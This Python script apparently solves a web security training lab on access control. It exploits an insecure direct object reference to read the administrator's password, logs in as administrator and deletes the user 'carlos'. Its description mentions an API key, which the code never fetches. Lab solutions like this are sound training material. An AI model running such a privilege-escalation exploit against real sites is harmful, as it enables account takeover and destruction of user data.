#####################
#    Libraries      #
#####################
import requests
import sys
import urllib3
import argparse
import re
from bs4 import BeautifulSoup as bs
import gc

#####################
#    Variables      #
#####################

## Disable requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

## Setup Proxies to future debugs
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser(prog=f'\n[+] WebAcademy Access Control: Lab 7'
                                ,description="Description: Obtain the API key for the user 'carlos' and submit it as the solution"
                                ,epilog='----------------------- END ---------------------------')
parser.add_argument('-u', metavar ='--url', action='store', dest='url', type=str, required=True, help="Target's URL")

args = parser.parse_args()


#####################
#    Functions      #
#####################

def get_csrf(login_url,s):
    print("[+] Trying to get the CSRF token")
    r = s.get(login_url,verify=False, proxies=proxies)
    # take GET's response, find and return the csrf
    return bs(r.text,"html.parser").find("input", {'name':'csrf'})['value']

def log_in(url, s, username, password):
    login_url = url + "/login"
    csrf_token = get_csrf(login_url,s)
    if csrf_token:
        data = {
            'csrf':csrf_token,
            'username': username,
            'password': password
            }
        print("[+] Got the CSRF Token")
        print(f"[+] Trying to log in as {username} user")
        r = s.post(login_url, data=data, verify=False, proxies=proxies)
        if "Log out" in r.text:
            print(f"[+] Logged in as {username}")
            return r
        else:
            print(f"[-] Couldn't log in as {username}")
            print("[-] Exiting")
            gc.collect()
            sys.exit(-1)
    else:
        print("[-] Couldn't get the CSRF Token")
        print("[-] Exiting")
        gc.collect()
        sys.exit(-1)

def get_password(url, s):
    r = log_in(url,s,'wiener','peter')
    my_account_url = url+"/my-account"
    params = {
            'id':'administrator'
            }
    print("[+] Trying to retrieve Administrator' Password")
    r = s.get(my_account_url, params=params, verify=False, proxies=proxies)
    admin_password = bs(r.text,'html.parser').find('input',{'name':'password'})['value']
    if admin_password:
        print(f"[+] Successfuly got the Administrator's Password... gotcha!!!\n\t[+] Administrator's Password: {admin_password}")
        logout_url = url + "/logout"
        r = s.get(logout_url, verify=False, proxies=proxies)
        if not "Log out" in r.text:
            print("[+] Logged out as Wiener")
            r = log_in(url,s,'administrator',admin_password)
            admin_delete_url = url + '/admin/delete'
            params = { 'username':'carlos' }
            r = s.get(admin_delete_url, params=params, verify=False, proxies=proxies)
            if r.status_code == 200:
                print("[+] Fucked carlos' user... done... booom...")
                print("[+] Exiting")
                gc.collect()
                sys.exit(-1)
            else:
                print("[-] Couldn't delete carlos' user")
                print("[-] Exiting")
                gc.collect()
                sys.exit(-1)
    else:
        print("[-] Couldn't get the administrator Password")
        print("[-] Exiting")
        gc.collect()
        sys.exit(-1)

def main():
    
    if len(sys.argv) != 3:
        print(f"[+] Usage:\n\t{sys.argv[0]} -u <Lab's URL>")
        print(f"[+] Example:\n\t{sys.argv[0]} -u https://random-code.web-security-academy.net")
        gc.collect()
        sys.exit(-1)
    else:
        s = requests.Session()
        url = args.url.rstrip('/')
        get_password(url,s)

if __name__ == "__main__":
    main()